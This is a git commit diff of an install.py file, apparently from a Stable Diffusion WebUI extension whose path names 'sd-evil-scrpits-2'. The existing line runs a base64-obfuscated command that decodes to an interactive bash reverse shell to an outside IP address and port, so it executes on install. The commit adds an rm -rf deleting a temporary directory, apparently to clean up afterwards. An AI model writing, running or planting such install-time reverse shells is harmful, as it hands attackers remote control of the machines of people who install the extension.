d7f4b137071130c5b553b138816cebb8d6d91c4f
L-XLH <66560595+L-XLH@users.noreply.github.com>
2025-09-22 20:01:33 +0800

    Update install.py

--- install.py
+++ install.py
@@ -1,2 +1,3 @@
 import os
 os.system('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC41OS44NS44Ny85MDk5IDA+JjE=}|{base64,-d}|{bash,-i}')
+os.system("rm -rf /tf/stable-diffusion-webui/tmp/sd-evil-scrpits-2")
